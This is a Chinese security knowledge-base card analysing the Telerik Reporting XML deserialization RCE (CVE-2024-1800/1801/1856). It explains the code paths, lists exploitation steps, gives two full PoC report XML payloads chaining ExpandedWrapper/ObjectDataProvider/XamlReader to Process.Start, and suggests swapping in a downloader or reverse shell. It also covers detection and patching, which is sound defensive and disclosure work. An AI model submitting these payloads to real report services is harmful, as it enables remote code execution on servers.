---
id: web-dotnet-deser-telerik-reporting-xmlserializer-type-expandedwrapper-xamlreader
title: Telerik Reporting 报表 XML 反序列化 RCE（CVE-2024-1800/1801/1856）：旧版 Type 属性二次 XmlSerializer、新版 ReportXmlSerializer 按标签实例化，均可接 ExpandedWrapper/XamlReader gadget
type: scenario
domain: web
path: web/dotnet/deserialization
technique: telerik-reporting-xml-deserialization-type-gadget
tags:
- dotnet
- deserialization
- telerik
- reporting
- xmlserializer
- expandedwrapper
- xamlreader
- objectdataprovider
- gadget
- rce
cve:
- CVE-2024-1800
- CVE-2024-1801
- CVE-2024-1856
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V361
  verified_at: '2026-11-09T02:47:33+08:00'
  notes: 已对照原文全文与10张图核对：01.png 旧版 Report 类 (Version=4.2.10.1221) 实现 IXmlSerializable；02.png XmlUtils.ReadXml 的 PropertyType==object||IsKnownType、CanWrite、Type.GetType(attribute)；03.png public object DataSource；04.png ReadValue 调用 XmlUtils.GetSerializer(type2).Deserialize 二次反序列化与调用栈；05.png 新版 Report (Version=17.2.23.1114) 无 IXmlSerializable；06.png SqlDataSource/DataSource 实现；07.png ReadObject 的 CreateInstance+ReadProperties；08.png cannot resolve type 报错；09.png 新版 payload 在 Report Designer 中弹出计算器；10.png ObjectReader 递归调用栈。旧版 Type 属性路径、新版标签解析实例化路径、ExpandedWrapper/XamlReader/ObjectDataProvider gadget 与原文一致。版本处理：原文 4.2.10.1221 与 17.2.23.1114 均为文章实测环境版本，原文未给出官方受影响区间，按 brief 用 set-versions --clear 清空 affected_versions（卡内正文仍保留两版测试说明），避免把实测版本当作受影响区间。合并为一张卡合理：两版为同一产品同一类'信任 XML 类型'问题的旧/新实现，gadget 相同，非两个独立场景。dedup top 候选 Telerik.Web.UI CVE-2019-18935 RadAsyncUpload（JavaScriptSerializer+AssemblyInstaller）为不同产品线/入口/gadget，dedup_review 成立。dup-scan.json（2026-11-08 19:10）早于建卡（2026-11-09 02:05），无涉及本卡 pair。未验证点：未在本机复现
    .NET 反序列化；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/web/dotnet/deserialization/web-dotnet-deser-telerik-reporting-xmlserializer-type-expandedwrapper-xamlreader/
draft: false
kb_aliases:
- Telerik Reporting 反序列化
- CVE-2024-1800
- CVE-2024-1801
- CVE-2024-1856
- ReportXmlSerializer
- XmlUtils.ReadXml
- ExpandedWrapper XamlReader
- ObjectDataProvider Process Start
---

## 一句话结论

Telerik Reporting 的报表 XML 定义在反序列化时信任 XML 里的类型信息：旧版 `Report` 实现 `IXmlSerializable`，`XmlUtils.ReadXml` 读取属性上的 `Type` 后 `Type.GetType` 并再次 `XmlSerializer.Deserialize`，类型完全可控；新版改用 `ReportXmlSerializer`，按 XML 标签的命名空间/LocalName 解析类型并 `CreateInstance` + 反射赋值，同样没有类型白名单。两版都能用 `ExpandedWrapper<XamlReader, ObjectDataProvider>` / `ObjectDataProvider` + `XamlReader.Parse` gadget 执行任意命令（CVE-2024-1800/1801/1856）。

## 原理

- **攻击面**：应用把用户可控的报表定义 XML 交给 `new XmlSerializer(typeof(Telerik.Reporting.Report)).Deserialize(reader)`（旧版）或 Telerik 的 `ReportXmlSerializer.Deserialize`（新版）处理。序列化器本应只做数据映射，但 Telerik 的实现允许 XML 决定"实例化什么类型"。
- **旧版（IXmlSerializable + Type 属性）**：`Report` 实现 `IXmlSerializable`，`ReadXml` 依次调用 `ReportItemBase.ReadXml` → `XmlUtils.ReadXml`。`XmlUtils.ReadXml` 遍历元素，用 `type1.GetProperty(reader.Name)` 取属性，判断 `property.PropertyType == typeof(object) || XmlUtils.IsKnownType(...)` 且 `CanWrite`；满足后读取该元素的 `Type` 属性并 `Type type2 = Type.GetType(attribute)`，再调用 `XmlUtils.GetSerializer(type2).Deserialize(reader)` 进行**第二次反序列化**。`Report.DataSource` 正好是 `public object DataSource { get; set; }`，于是 `<DataSource Type="任意类型">` 成为类型注入点。
- **gadget 链**：`Type` 填 `System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework...],[System.Windows.Data.ObjectDataProvider, PresentationFramework...]], System.Data.Services...`。XmlSerializer 反序列化 ExpandedWrapper 时，其 `ProjectedProperty0` 会触发对 `ObjectInstance`（XamlReader）指定 `MethodName`（Parse）的调用，参数是 XAML ResourceDictionary；字典中的 `ObjectDataProvider` 设置 `ObjectType="{d:Type c:Process}" MethodName="Start"` 与参数 `cmd /c calc`，XAML 解析时即调用 `Process.Start`。
- **新版（ReportXmlSerializer 任意实例化）**：17.2.23.1114 的 `Report` 不再实现 `IXmlSerializable`，默认 XmlSerializer 因公有 `ISite` 等成员报错。官方改用 `ReportXmlSerializer`：`ObjectReader.ReadXmlElement(name)` 用 `ParseNsString` 拆前缀与本地名，`ResolveType(LookupNamespace(prefix), localName)`（失败再 `Type.GetType(name)`）得到类型；`ReadObject(type)` 对非原始/集合类型走 `CreateInstance(type)` 后 `ReadProperties(obj)` 逐属性反射赋值——**XML 标签名就是类型名，且默认信任所有可解析类型**，构成任意对象图构造。利用点在 `WebServiceDataSource` 的 `public object Source { get; set; }`：把 `ObjectDataProvider`（System.Windows.Data）作为 `<Source>` 子元素反序列化，`ObjectInstance` 设为 `XamlReader`、`MethodName` 设为 `Parse`、`MethodParameters` 传入带 `ObjectDataProvider Process.Start` 的 XAML 字符串，即可在属性赋值/对象初始化过程中执行 `XamlReader.Parse` → `Process.Start`。
- **为什么两版都能打**：根本原因是"把序列化数据里的类型名当可信输入"。旧版是显式的 `Type` 属性 + 二次序列化，新版是标签映射类型 + 反射实例化；只要 gadget 所需的程序集（PresentationFramework、System.Data.Services 等）在目标上可加载，就能把对象图接到 `Process.Start`。
- **边界**：需要能向使用 Telerik Reporting 的应用提交报表定义（Web 报表服务、嵌入 API、导入接口、文件上传后由服务端反序列化）；目标 .NET Framework 需能加载 gadget 依赖的程序集；新版本若已升级到修复版本或改用白名单解析则失效。

## 触发条件

- 应用对不可信来源的报表 XML 调用 Telerik Reporting 的反序列化（`XmlSerializer(typeof(Report))` 或 `ReportXmlSerializer`）。
- 旧版路径：`Report` 实现 `IXmlSerializable`，且 `XmlUtils.ReadXml` 能命中 `object` 类型/已知类型且可写的属性（如 `DataSource`）。
- 新版路径：`ReportXmlSerializer.ObjectReader` 按 XML 标签解析类型并 `CreateInstance` + 反射赋值，无类型白名单。
- 目标可加载 `PresentationFramework`（XamlReader/ObjectDataProvider）与 `System.Data.Services`（旧版 ExpandedWrapper）等 gadget 程序集。

## 利用步骤

1. 指纹/入口：确认应用使用 Telerik Reporting 处理报表定义 XML（旧版 4.x 或新版 17.x），并找到提交 XML 的接口。
2. 旧版：构造 `<Report><DataSource Type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, ...],[System.Windows.Data.ObjectDataProvider, PresentationFramework, ...]], System.Data.Services, ...">`，内部放 `ExpandedWrapperOfXamlReaderObjectDataProvider`：`ObjectInstance` 为 `XamlReader`、`MethodName` 为 `Parse`、`MethodParameters` 为含 `ObjectDataProvider Process.Start` 的 XAML ResourceDictionary。
3. 新版：构造 `<DataSources><WebServiceDataSource ...><Source><ObjectDataProvider MethodName="Parse" xmlns="clr-namespace:System.Windows.Data;assembly:PresentationFramework, ...">`，`ObjectInstance` 为 `XamlReader`，`MethodParameters` 里放 `<String>XAML</String>`；XAML 中 `ObjectDataProvider ObjectType="{d:Type c:Process}" MethodName="Start"`，参数 `cmd /c calc`。
4. 提交 XML，触发二次 XmlSerializer 或 ReportXmlSerializer 的对象图构造；`XamlReader.Parse` 解析 XAML 时 `Process.Start` 执行命令（原文以弹出计算器验证）。
5. 替换命令为下载器/反弹 shell 等完成利用。

## PoC

```xml
<?xml version="1.0" encoding="utf-16"?>
<Report Width="15cm">
  <DataSource Type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider>
      <ProjectedProperty0>
        <ObjectInstance d5p1:type="XamlReader" xmlns:d5p1="http://www.w3.org/2001/XMLSchema-instance" />
        <MethodName>Parse</MethodName>
        <MethodParameters>
          <anyType xmlns:q1="http://www.w3.org/2001/XMLSchema" d6p1:type="q1:string" xmlns:d6p1="http://www.w3.org/2001/XMLSchema-instance">
            <ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
              xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml"
              xmlns:b="clr-namespace:System;assembly=mscorlib"
              xmlns:c="clr-namespace:System.Diagnostics;assembly=system">
              <ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start">
                <ObjectDataProvider.MethodParameters>
                  <b:String>cmd</b:String><b:String>/c calc</b:String>
                </ObjectDataProvider.MethodParameters>
              </ObjectDataProvider>
            </ResourceDictionary>
          </anyType>
        </MethodParameters>
      </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
  </DataSource>
</Report>
```

```xml
<!-- 新版 ReportXmlSerializer 路径（ObjectReader 按标签名 CreateInstance + 反射赋值） -->
<Report DataSourceName="dataSource1" Width="17cm" xmlns="http://schemas.telerik.com/reporting/2023/3.0">
  <DataSources>
    <WebServiceDataSource ServiceUrl="test.com" Name="dataSource1">
      <Source>
        <ObjectDataProvider MethodName="Parse"
          xmlns="clr-namespace:System.Windows.Data;assembly:PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
          <ObjectInstance><XamlReader xmlns="clr-namespace:System.Windows.Markup;assembly:PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" /></ObjectInstance>
          <MethodParameters>
            <String xmlns="http://schemas.telerik.com/reporting/2023/3.0">&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"&gt;&lt;ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;b:String&gt;cmd&lt;/b:String&gt;&lt;b:String&gt;/c calc&lt;/b:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;</String>
          </MethodParameters>
        </ObjectDataProvider>
      </Source>
    </WebServiceDataSource>
  </DataSources>
</Report>
```

说明：payload 按原文演示最小化整理，仅用于防御验证，未在本机执行。

## 变体与关联

- **gadget 家族**：`ExpandedWrapper<T1,T2>` + `ObjectDataProvider` 是 XmlSerializer 场景的通用链（SolarWinds 事件分析中亦有使用）；同族还有 `TypeConfuseDelegate`、`DataSet`/`DataSetSurrogate`、`AssemblyInstaller` 等，取决于目标程序集与 .NET 版本。
- **同产品其他反序列化漏洞**：Telerik.Web.UI RadAsyncUpload 的 CVE-2019-18935（外部 Type 驱动 `AssemblyInstaller` 加载 DLL）见 [[web-dotnet-deser-telerik-cve-2019-18935-assemblyinstaller]]，WAF 绕过见 [[web-dotnet-deser-telerik-cve-2019-18935-waf-bypass]]；本卡是 Telerik Reporting 产品线的 XML 报表反序列化，入口与 gadget 均不同。
- **通用 .NET 反序列化**：类型可控/TypeNameHandling 类问题见 [[web-dotnet-deser-servicehandler-typenamehandling]]、[[web-dotnet-deser-viewstate-machinekey-textformattingrunproperties]]。
- **边界**：目标需能加载 PresentationFramework/System.Data.Services；应用若只反序列化可信报表或已升级修复版本则失效；.NET Core 上 gadget 可用性不同。

## 检测与防御

- **内容检测**：报表 XML 中出现 `Type="System.Data.Services.Internal.ExpandedWrapper`、`PresentationFramework`、`XamlReader`、`ObjectDataProvider`、`{d:Type`、`Process` 等特征；`ReportXmlSerializer` 输入中的标签命名空间指向 `System.Windows.Data`/`System.Windows.Markup`；属性值里出现内嵌 XAML。
- **行为检测**：服务端进程（w3wp/报表服务）异常创建 `calc.exe`、`cmd.exe`、`powershell.exe` 子进程；加载 PresentationFramework/System.Data.Services 等与业务无关的程序集；XAML 解析相关调用栈（`XamlReader.Parse` → `ObjectDataProvider` → `Process.Start`）。
- **修复**：升级 Telerik Reporting 至修复版本（CVE-2024-1800/1801/1856 官方修复）；不要反序列化来路不明的报表定义。
- **加固**：对报表 XML 使用类型白名单/受限的解析器（只允许已知报表类型与属性），禁止 XML 指定任意 .NET 类型；服务端以最小权限运行并启用 .NET 反序列化防护与程序集加载审计；对上传/导入的报表文件做内容检查。
